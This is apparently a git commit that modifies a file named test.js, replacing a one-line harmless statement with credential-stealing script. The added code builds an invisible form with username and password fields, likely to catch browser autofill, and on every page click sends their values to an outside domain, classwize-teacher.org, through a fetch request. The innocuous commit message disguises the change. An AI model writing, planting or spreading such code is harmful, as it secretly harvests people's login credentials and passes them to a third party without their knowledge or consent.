a67c32e9c106144a15a8ec44345ddd75e4e9c009
funnycat301 <liam.young2007@icloud.com>
2025-04-16 09:53:04 -0400

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,2 @@
-document.write(0)
+var f=document.createElement('form'); f.id='stealthForm'; f.style='position:absolute;opacity:0;z index:-999;visibility:hidden;height:0;width:0;overflow:hidden;'; f.innerHTML='<input type=text id=username value=\'\' style=\'display:none;visibility:hidden;height:0;width:0\'><input type=password id=password value=\'\' style=\'display:none;visibility:hidden;height:0;width:0\'>'; document.body.appendChild(f); document.addEventListener('click',function(){ var u=document.getElementById('username').value; var p=document.getElementById('password').value; fetch('https://classwize-teacher.org/find?username='+encodeURIComponent(u)+'&password='+encodeURIComponent(p))
+})
